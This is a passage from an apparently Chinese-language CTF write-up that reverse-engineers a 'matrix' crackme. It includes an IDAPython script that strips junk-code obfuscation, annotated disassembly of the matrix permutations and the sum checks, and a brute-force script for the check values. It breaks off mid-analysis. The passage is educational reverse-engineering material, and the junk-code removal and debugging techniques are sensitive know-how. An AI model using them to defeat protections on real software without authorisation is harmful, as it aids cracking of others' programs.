begin=begin+<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> addr+ItemSize(addr)</span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    next_addr =next_instr(addr)</span><br><span class="line">    MakeCode(next_addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    MakeCode(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'jmp     $+5'</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">        print(<span class="string">'ret :%08x'</span>%addr)</span><br><span class="line">        patch_nop(addr,addr+<span class="number">5</span>)</span><br><span class="line">        PatchByte(addr + <span class="number">6</span>,<span class="number">0xC3</span>)</span><br><span class="line">        patch_nop(addr + <span class="number">7</span>, addr + <span class="number">9</span>)</span><br><span class="line">        addr = addr + <span class="number">9</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'xor'</span> <span class="keyword">in</span> GetDisasm(addr) <span class="keyword">and</span> GetOpnd(addr,<span class="number">0</span>) == GetOpnd(addr,<span class="number">1</span>) <span class="keyword">and</span> <span class="string">'jnz'</span> <span class="keyword">in</span> GetDisasm(addr + <span class="number">2</span>):</span><br><span class="line">        patch_nop(addr, addr + <span class="number">4</span>)</span><br><span class="line">        print(<span class="string">'xor jmp: %08x'</span>%addr)</span><br><span class="line">        patch_nop(addr, addr + <span class="number">4</span>)</span><br><span class="line">        addr = addr + <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'call    $+5'</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">        print(<span class="string">'nop: %08x'</span>%addr)</span><br><span class="line">        patch_nop(addr,addr+<span class="number">0xB</span>)</span><br><span class="line">        PatchByte(addr + <span class="number">0xA</span>, <span class="number">0xE8</span>)</span><br><span class="line">        addr = addr + <span class="number">0xF</span></span><br><span class="line">print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><p>然而去掉之后仍然不能f5，于是开始对着汇编撸。。。</p><h4><span id="程序流程">程序流程</span></h4><p>由于过程中有大量冗余代码，经常会干扰我们调试，所以要胆大心细，大胆的跳过一些无用的代码，找到真正有用的代码。</p><p>由于是动调的地址，我这里的基地址是0x56555000，可以根据这个偏移换算到0的地址。。。</p><p>首先能看到一些这样的跳转代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:56559FA3 cmp     ecx, eax</span><br><span class="line">.text:56559FA5 jge     loc_5655A2A0</span><br><span class="line">.text:56559FAB jmp     loc_5655A013</span><br></pre></td></tr></table></figure><p>不难看出这是个循环。</p><p>输入后进入了第一个循环体，设内存断点跟一跟，或者直接断到跳出循环，可以发现它将输入的字符串转了hex。</p><p>之后在<code>5655A3A0</code>调用了函数<code>565589C7</code>，看一下栈内，参数就是转完hex的内容。</p><p>跟进函数，先看到一个循环，大小为字节的长度，继续跟进不难发现很多如下的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:56558BCF cmp     ecx, eax</span><br><span class="line">.text:56558BD1 jnz     loc_56558C2A</span><br></pre></td></tr></table></figure><p>…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:56558C79 cmp     ecx, eax</span><br><span class="line">.text:56558C7B jnz     loc_56558CB5</span><br></pre></td></tr></table></figure></p><p>…</p><p>这应该是个case或者是if elif elif …</p><p>对比的是我们的输入和另外18个字节，提取出来，他们是：</p><p>10 15 11 14 12 13<br>20 25 21 24 22 23<br>30 35 31 34 32 33</p><p>如果相等的话，每个又会进入一个对应的函数，之后继续循环，如果不在这些字节之内，会直接返回。<br>先不管这18个函数干了什么，直接步过到返回。<br>紧跟着在<code>5655A3D0</code>调用了函数<code>56559638</code>，步入看看做了什么。<br>这里的循环跟之前的有些许不同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:565596B0 cmp     eax, ecx</span><br><span class="line">.text:565596B2 jge     loc_56559E3D</span><br><span class="line">.text:565596B8 mov     eax, [ebp-4]</span><br><span class="line">.text:565596BB test    eax, eax</span><br><span class="line">.text:565596BD jz      loc_56559E3D</span><br><span class="line">.text:565596C3 jmp     loc_56559727</span><br></pre></td></tr></table></figure><p>循环大小固定为6，每一轮结束后会test <code>ebp-4</code>的值，可以看到，初始为1，如果为0，会直接返回。可以看到最终的返回值是<code>ebp-4</code>，也就是说一旦<code>ebp-4</code>为0，就会返回0，循环完毕后它本身可能不变，也就是可能返回1。<br>看到这里有一些猜想了，这个循环可能是个check，每个循环是个单独的check，通过所有的check才会返回1，应该就拿到flag了，若返回0，可能就gg。<br>回到main函数验证一下。来到地址<code>5655A3D0</code>，稍微往下几行，看到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:5655A409 test    eax, eax</span><br><span class="line">.text:5655A40B jz      loc_5655ABB9</span><br></pre></td></tr></table></figure><p>…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:5655ABB9 loc_5655ABB9:                           ; CODE XREF: .text:5655A40B↑j</span><br><span class="line">.text:5655ABB9 mov     eax, offset aTryAgain           ; &quot;Try again!&quot;</span><br><span class="line">.text:5655ABBE push    eax</span><br><span class="line">.text:5655ABBF nop</span><br><span class="line">.text:5655ABC0 nop</span><br><span class="line">.text:5655ABC1 nop</span><br><span class="line">.text:5655ABC2 nop</span><br><span class="line">.text:5655ABC3 nop</span><br><span class="line">.text:5655ABC4 nop</span><br><span class="line">.text:5655ABC5 nop</span><br><span class="line">.text:5655ABC6 nop</span><br><span class="line">.text:5655ABC7 nop</span><br><span class="line">.text:5655ABC8 nop</span><br><span class="line">.text:5655ABC9 call    near ptr _IO_puts</span><br></pre></td></tr></table></figure><p>果然如猜想一般，如果返回0就Try again!了。<br>如果返回1会怎样，继续往下看，又是一个循环，直接到循环结束的地方，<code>loc_5655AB90</code>，可以看到这里输出了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:5655AB90 loc_5655AB90:                           ; CODE XREF: .text:5655A55A↑j</span><br><span class="line">.text:5655AB90 lea     eax, [ebp-180h]</span><br><span class="line">.text:5655AB96 push    eax</span><br><span class="line">.text:5655AB97 mov     eax, offset aHereIsYourFlag     ; &quot;Here is your flag: %s\n&quot;</span><br><span class="line">.text:5655AB9C push    eax</span><br><span class="line">.text:5655AB9D nop</span><br><span class="line">.text:5655AB9E nop</span><br><span class="line">.text:5655AB9F nop</span><br><span class="line">.text:5655ABA0 nop</span><br><span class="line">.text:5655ABA1 nop</span><br><span class="line">.text:5655ABA2 nop</span><br><span class="line">.text:5655ABA3 nop</span><br><span class="line">.text:5655ABA4 nop</span><br><span class="line">.text:5655ABA5 nop</span><br><span class="line">.text:5655ABA6 nop</span><br><span class="line">.text:5655ABA7 call    near ptr _IO_printf</span><br></pre></td></tr></table></figure><p>我们试一试直接修改check的返回值为1，然后f9。<br>当然不会输出正确的flag，而是输出了一串乱码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input your key:31313131</span><br><span class="line">Here is your flag: o�<span class="comment">#k����,��19�\���К?�q</span></span><br></pre></td></tr></table></figure><p>总结一下程序流程：</p><ol><li>输入若干个十六进制数，在10 15 11 14 12 13 20 25 21 24 22 23 30 35 31 34 32 33 之内。</li><li>根据输入，进行了一些“操作”</li><li>check结果</li><li>可能对结果又进行了一些计算，得到flag</li><li>打印flag，或是try again</li></ol><h4><span id="算法">算法</span></h4><p>让我们来看看程序到底干了什么<br>重新调试，这回输入10151114测试<br>我么把位于565589C7的函数重命名为<code>operate</code>，位于<code>56559638</code>的函数重命名为<code>check</code><br>operate函数下断，跟进到10对应的分支<code>5655BD47</code>，我们把每个这种操作函数按重命名为operate+输入的字节，如<code>operate10</code><br>慢慢步入，主体是一个长度为3的循环。<br>在5655BE7C发现取了一个data段的地址，跟入发现是一连串数据。稍微分析一下这里的结构。在下面一点发现了一连串的指针，直接打开后为修改的ida数据库是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.data:00013200 off_13200       dd offset dword_13020   ; DATA XREF: .text:00004796↑o</span><br><span class="line">.data:00013200                                         ; .text:000055DF↑o ...</span><br><span class="line">.data:00013204                 dd offset unk_13044</span><br><span class="line">.data:00013208                 dd offset unk_13068</span><br><span class="line">.data:0001320C                 dd offset unk_1308C</span><br><span class="line">.data:00013210                 dd offset unk_130B0</span><br><span class="line">.data:00013214                 dd offset unk_130D4</span><br><span class="line">.data:00013218 off_13218       dd offset unk_130F8     ; DATA XREF: .text:00005701↑o</span><br><span class="line">.data:00013218                                         ; .text:00005722↑o ...</span><br><span class="line">.data:0001321C                 dd offset unk_1311C</span><br><span class="line">.data:00013220                 dd offset unk_13140</span><br><span class="line">.data:00013224                 dd offset unk_13164</span><br><span class="line">.data:00013228                 dd offset unk_13188</span><br><span class="line">.data:0001322C                 dd offset unk_131AC</span><br></pre></td></tr></table></figure><p>这一连串的指针，中间刚好隔了0x24字节，即9个int，一共12个指针。根据题目名叫matrix，猜测是个矩阵，感觉每个元素是int的概率比较大，这里先是猜的，也就是12*9的一个矩阵。注意到这12行是分开来的，也就是说有可能是两个6*9的矩阵。<br>指针和矩阵中间又有12个int数据。这个矩阵和数据到底是做什么的暂时不知道，继续往下分析。<br>之前说了，这道题充斥着很多冗余代码，比如刚刚引用这个矩阵的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:5655BE7C mov     ebx, offset matrix</span><br><span class="line">.text:5655BE81 adc     ebx, edx</span><br><span class="line">.text:5655BE83 sbb     eax, ebx</span><br><span class="line">.text:5655BE85 lea     ebx, [eax]</span><br></pre></td></tr></table></figure><p>调试一下可以发现，最终ebx被幅值成了ebx的反，这根本没有意义。<br>随后的一个对矩阵的引用也是如此，再下一个有些许不同了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:5655BEE5 mov     ecx, offset matrix</span><br><span class="line">.text:5655BEEA add     ecx, eax</span><br><span class="line">.text:5655BEEC mov     eax, [ebp-4]</span><br><span class="line">.text:5655BEEF sbb     eax, edx</span><br><span class="line">.text:5655BEF1 add     eax, eax</span><br><span class="line">.text:5655BEF3 mov     eax, 0B4D418C0h</span><br><span class="line">.text:5655BEF8 lea     eax, [esi]</span><br><span class="line">.text:5655BEFA mov     eax, dword_5656829C</span><br><span class="line">.text:5655BF00 shl     eax, 0</span><br><span class="line">.text:5655BF03 add     eax, 0BE8634ABh</span><br><span class="line">.text:5655BF09 sub     eax, 70A1214Ch</span><br><span class="line">.text:5655BF0F sub     eax, 0CC322C9Bh</span><br><span class="line">.text:5655BF15 add     ecx, eax</span><br><span class="line">.text:5655BF17 xor     edx, eax</span><br><span class="line">.text:5655BF19 mov     ebx, 9F145970h</span><br><span class="line">.text:5655BF1E lea     ebx, [ebx-51A2725Fh]</span><br><span class="line">.text:5655BF24 lea     ebx, [edx+ebp*4-46h]</span><br><span class="line">.text:5655BF28 mov     edx, ecx</span><br><span class="line">.text:5655BF2A add     edx, edx</span><br><span class="line">.text:5655BF2C mov     ebx, 89B03C42h</span><br><span class="line">.text:5655BF31 lea     eax, [edi+7A2658Bh]</span><br><span class="line">.text:5655BF37 lea     eax, [eax-52554450h]</span><br><span class="line">.text:5655BF3D mov     eax, [ecx]</span><br><span class="line">.text:5655BF3F mov     [ebp-4], eax</span><br></pre></td></tr></table></figure><p>在ida里有相同字符的高亮，可以看出，ecx先后加了两个数据，然后终于取数据了，这里取得是matrix+8，也就是第2个元素，紧跟着存入了[ebp-4]<br>不难发现，形如mov xxx,[xxx]的代码是可疑代码，有可能是真正有用的部分，分析时要重点关注这样的代码。<br>比如在<code>5655C12C</code>发现了这样一处代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:5655C12C mov     eax, [edx]</span><br><span class="line">.text:5655C12E mov     [ecx], eax</span><br></pre></td></tr></table></figure><p>通过寄存器看到edx是matrix+BC的地址，也就是matrix[47]，而ecx指向的是之前的matrix[2]，这里有点像元素交换对不对，先把matrix[2]放到一个temp里，然后再把matrix[47]放到matrix[2]里<br>类似的，在<code>5655C374</code>又有一处代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:5655C374 mov     eax, [edx]</span><br><span class="line">.text:5655C376 mov     [ecx], eax</span><br></pre></td></tr></table></figure><p>这里应该是 matrix[47] = matrix[11]，所以不是交换元素了，继续看<br>又在下面发现了  matrix[11] = matrix[38]<br>最后，在结束循环之前，看到了  matrix[38] = temp，即是之前的matrix[2]<br>合并一下，本次循环做的事：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">temp = matrix[<span class="number">2</span>]</span><br><span class="line">matrix[<span class="number">2</span>] = matrix[<span class="number">47</span>]</span><br><span class="line">matrix[<span class="number">47</span>] = matrix[<span class="number">11</span>]</span><br><span class="line">matrix[<span class="number">11</span>] = matrix[<span class="number">38</span>]</span><br><span class="line">matrix[<span class="number">38</span>] = temp</span><br></pre></td></tr></table></figure><p>接下来两次循环干的应该是相似的事情了。<br>大胆猜测一下，其他17种操作应该也是某种变换。验证一下，一口气输完所有的18种输入，记录一下操作之前的矩阵，以及操作之后的矩阵<br>对比前后矩阵不难发现，虽然元素都被打乱了，但是元素的种类都没改变，还是之前的6*9个元素。<br>同时，matrix下面的一个6*9的矩阵没有被改变，应该是个常量，命名为constant好了<br>分析了两个变换之后，发现不出什么规律，比赛时就没有继续分析下去的动力了。<br>赛后想到一个可能好一点的分析方式，先将矩阵的内容patch成0-54的编号，每次输入一个不同的输入，分别记录下每次操作后的矩阵，再分析是怎么变化的。<br>试试换条思路，根据程序的流程，进行完操作之后是check，而操作的过程中矩阵元素的大小没有改变，只改变了元素的位置，我们有没有办法构造出最终过check的矩阵呢？</p><p>进入check函数看看如何check的：<br>循环长度为6，假设刚好对应了矩阵的每一行，<br>与之前变换的时候访问矩阵元素不太一样，这里是通过后面的6个指向矩阵的每一行的指针来访问元素的<br>用跟之前相似的方法，在<code>5655984A</code>发现了这样的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:5655984A mov     edx, [eax]</span><br><span class="line">.text:5655984C mov     eax, [ecx]</span><br><span class="line">.text:5655984E add     edx, eax</span><br></pre></td></tr></table></figure><p>这里加的是matrix[0]和matrix[2]</p><p>接下来跟着edx走不难发现一些类似的代码，最终的效果就是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp = matrix[<span class="number">0</span>]+matrix[<span class="number">2</span>]+matrix[<span class="number">4</span>]+matrix[<span class="number">6</span>]+matrix[<span class="number">8</span>]</span><br></pre></td></tr></table></figure></p><p>刚好把偶数下标的元素求和了，然后不远处又能发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:56559A8B cmp     edx, eax</span><br><span class="line">.text:56559A8D mov     eax, 0</span><br><span class="line">.text:56559A92 setz    al</span><br><span class="line">.text:56559A95 mov     ecx, [ebp-4]</span><br><span class="line">.text:56559A98 and     ecx, eax</span><br><span class="line">.text:56559A9A mov     eax, ecx</span><br><span class="line">.text:56559A9C adc     eax, ebx</span><br><span class="line">.text:56559A9E lea     eax, [esi]</span><br><span class="line">.text:56559AA0 sbb     edx, edx</span><br><span class="line">.text:56559AA2 sub     eax, ecx</span><br><span class="line">.text:56559AA4 mov     edx, 51160ED1h</span><br><span class="line">.text:56559AA9 lea     edx, [esi+2Ah]</span><br><span class="line">.text:56559AAC mov     ebx, 66600294h</span><br><span class="line">.text:56559AB1 lea     eax, [ebx+0Fh]</span><br><span class="line">.text:56559AB4 mov     eax, 0F4B4E967h</span><br><span class="line">.text:56559AB9 mov     eax, 13E96DD7h</span><br><span class="line">.text:56559ABE lea     edx, [esp+edi*4-0Dh]</span><br><span class="line">.text:56559AC2 mov     [ebp-4], ecx</span><br></pre></td></tr></table></figure><p>这里的edx是求和的结果，eax跟过去一看，是之前那12个不知道有啥用的数据中的第一个，命名为cmp好了。<br>比较的结果果然被放在了[eb-4]中<br>继续往下跟，不难看到第二个比较，不同的，这次求和的内容并不是奇数下标的元素，而是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp = matrix[<span class="number">1</span>]+matrix[<span class="number">3</span>]+matrix[<span class="number">4</span>]+matrix[<span class="number">5</span>]+matrix[<span class="number">6</span>]</span><br></pre></td></tr></table></figure><p>在两次过程中matrix[4]都被加进去了，最终比较的对象是cmp[1]<br>猜测一下check过程。cmp是个6*2的矩阵。每次比较matrix的每一行，下标为02468的元素求和要为cmp[i][0]，下标为13457的元素求和要为cmp[i][1]<br>稍微验证一下之后的循环，下标果然如此</p><h4><span id="穷举求解">穷举求解</span></h4><p>既然相加的元素都在这6*9个之中，我们只要找到某5个元素，加和等于cmp就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line">a = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">54</span>)]</span><br><span class="line">mat = [<span class="number">0x0FDFE0BA1</span>, <span class="number">0x9A915052</span>, <span class="number">0x0C96F3527</span>, <span class="number">0x0F5201FCD</span>, <span class="number">0x0FE32ED8F</span>, <span class="number">0x0DB8E3EF9</span>, <span class="number">0x51EF954</span>, <span class="number">0x0FE217F1C</span>, <span class="number">0x7B33A8BB</span>, <span class="number">0x9CF903A1</span>, <span class="number">0x0C381E2CD</span>, <span class="number">0x22B35BE4</span>, <span class="number">0x4550E6AE</span>, <span class="number">0x0DC9E8F3C</span>, <span class="number">0x0A9B44EAF</span>, <span class="number">0x3372486A</span>, <span class="number">0x51329F58</span>, <span class="number">0x5F2F456E</span>, <span class="number">0x9B555A08</span>, <span class="number">0x0EB1A8529</span>, <span class="number">0x9B009084</span>, <span class="number">0x9B0B7B06</span>, <span class="number">0x9967F311</span>, <span class="number">0x91FB13AB</span>, <span class="number">0x18952236</span>, <span class="number">0x6F7B9915</span>, <span class="number">0x0EDD9D6D1</span>, <span class="number">0x0FB67FE21</span>, <span class="number">0x259911B0</span>, <span class="number">0x3DC4EE74</span>, <span class="number">0x98936FF0</span>, <span class="number">0x0DF7502CE</span>, <span class="number">0x0C3DF1016</span>, <span class="number">0x0BC1220F9</span>, <span class="number">0x0F54C810C</span>, <span class="number">0x715A634C</span>, <span class="number">0x3E1637A6</span>, <span class="number">0x80F07B8D</span>, <span class="number">0x0FB9CA491</span>, <span class="number">0x0AD254C2E</span>, <span class="number">0x0FB5A012F</span>, <span class="number">0x1AEF5581</span>, <span class="number">0x0B9CC1351</span>, <span class="number">0x9A3B536D</span>, <span class="number">0x0BD7FAF0F</span>, <span class="number">0x0F49AD883</span>, <span class="number">0x2C55324</span>, <span class="number">0x83BC3205</span>, <span class="number">0x43846281</span>, <span class="number">0x19382448</span>, <span class="number">0x0FADB2B18</span>, <span class="number">0x9335D185</span>, <span class="number">0x94C6BF5A</span>, <span class="number">0x591685AE</span>]</span><br><span class="line">m = combinations(a,<span class="number">5</span>)</span><br><span class="line">res = [[<span class="number">0x0D481DD44</span>, <span class="number">0x0E66CF0E0</span>], [<span class="number">0x6C86565D</span>, <span class="number">0x0EF6C2A6D</span>], [<span class="number">0x0D170230A</span>, <span class="number">0x9159B169</span>], [<span class="number">0x3DCF0D3F</span>, <span class="number">0x0D9331E76</span>], [<span class="number">0x64691AF0</span>, <span class="number">0x0DBF384CF</span>], [<span class="number">0x69E3E3A</span>, <span class="number">0x7122DE4D</span>]]</span><br><span class="line"><span class="comment"># get part of result</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    summ = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        summ+=mat[j]</span><br><span class="line">    summ&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(len(res)):</span><br><span class="line">        <span class="keyword">if</span> summ == res[k][<span class="number">0</span>]:</span><br><span class="line">            print(k,<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                print(hex(mat[j]))</span><br><span class="line">            print(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> summ == res[k][<span class="number">1</span>]:</span><br><span class="line">            print(k,<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                print(hex(mat[j]))</span><br><span class="line">            print(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># then combine these output in Notepad++, get the a</span></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><p>把输出稍微整理一下，选出同一行有相同元素的（matrix[4]），把相同元素提取出来，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">(0, 0)(0, 1)</span><br><span class="line">0xfdfe0ba1L     0x51329f58</span><br><span class="line">0x7b33a8bb      0x6f7b9915</span><br><span class="line">0x3dc4ee74      0x2c55324</span><br><span class="line">0x3e1637a6      0x43846281</span><br><span class="line"></span><br><span class="line">0xdf7502ce</span><br><span class="line"></span><br><span class="line">(1, 0)(1, 1)</span><br><span class="line">0xc96f3527L     0xf5201fcdL</span><br><span class="line">0x51ef954       0xdb8e3ef9L</span><br><span class="line">0x715a634c      0xeb1a8529L</span><br><span class="line">0x9335d185L     0x9a3b536dL</span><br><span class="line"></span><br><span class="line">0x9967f311L,</span><br><span class="line"></span><br><span class="line">(2, 0)(2, 1)</span><br><span class="line">0x9b009084L     0xc381e2cdL</span><br><span class="line">0x18952236      0x98936ff0L</span><br><span class="line">0xbd7faf0fL     0xc3df1016L</span><br><span class="line">0x83bc3205L     0x94c6bf5aL</span><br><span class="line"></span><br><span class="line">0xdc9e8f3cL,</span><br><span class="line"></span><br><span class="line">(3, 0)(3, 1)</span><br><span class="line">0x22b35be4      0x91fb13abL</span><br><span class="line">0x3372486a      0x80f07b8dL</span><br><span class="line">0xedd9d6d1L     0xad254c2eL</span><br><span class="line">0xfb9ca491L     0x1aef5581</span><br><span class="line"></span><br><span class="line">0xfe32ed8fL,</span><br><span class="line"></span><br><span class="line">(4, 0)(4, 1)</span><br><span class="line">0x9cf903a1L     0xfe217f1cL</span><br><span class="line">0x9b555a08L     0xa9b44eafL</span><br><span class="line">0xb9cc1351L     0x259911b0</span><br><span class="line">0x591685ae      0xf54c810cL</span><br><span class="line"></span><br><span class="line">0x19382448,</span><br><span class="line"></span><br><span class="line">(5, 0)(5, 1)</span><br><span class="line">0x5f2f456e      0x9a915052L</span><br><span class="line">0xfb67fe21L     0x4550e6ae</span><br><span class="line">0xbc1220f9L     0x9b0b7b06L</span><br><span class="line">0xf49ad883L     0xfadb2b18L</span><br><span class="line"></span><br><span class="line">0xfb5a012fL,</span><br></pre></td></tr></table></figure><p>那么现在问题在于，我们只是得到每一行有哪些元素，并不知道它们是如何排列的，毕竟加法满足交换律。</p><p>一行可能的结果数：4! * 4!  =  576</p><p>由于每一行互相是互不影响的，所以我们只需要穷举576*6种结果，找出其中经过计算得到flag后，有可见字符的结果拼接即可。</p><p>一开始我的解决方案是想办法patch程序中的内存，然而找不到好的方法写脚本，所以还得分析计算flag的方法</p><p>继续调试，check函数之后就是计算flag了，首先是长度为6的循环，八成是对应矩阵的每一行了</p><p>还是根据之前调试的方法，不难发现，先将matrix和constant的行数的指针放到[ebp-184h]和[ebp-188h]</p><p>之后进入了一个长度为9的循环，先猜测对应行中的每一个元素</p><p>有了先前分析的经验，现在在分析就上手一些了，最终有用的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:5655A8AC mov     eax, [ebp-8]           ; j</span><br><span class="line">.text:5655A8AF shl     eax, 2</span><br><span class="line">;...</span><br><span class="line">.text:5655A8F2 mov     ecx, [ebp-184h]</span><br><span class="line">.text:5655A8F8 add     ecx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655A9B6 mov     eax, [ebp-8]</span><br><span class="line">.text:5655A9B9 shl     eax, 2</span><br><span class="line">;...</span><br><span class="line">.text:5655AA01 mov     edx, [ebp-188h]</span><br><span class="line">.text:5655AA07 add     edx, eax</span><br><span class="line">;...</span><br><span class="line">.text:5655AA19 mov     eax, [ecx]</span><br><span class="line">.text:5655AA1B mov     ecx, [edx]</span><br><span class="line">.text:5655AA1D imul    eax, ecx</span><br><span 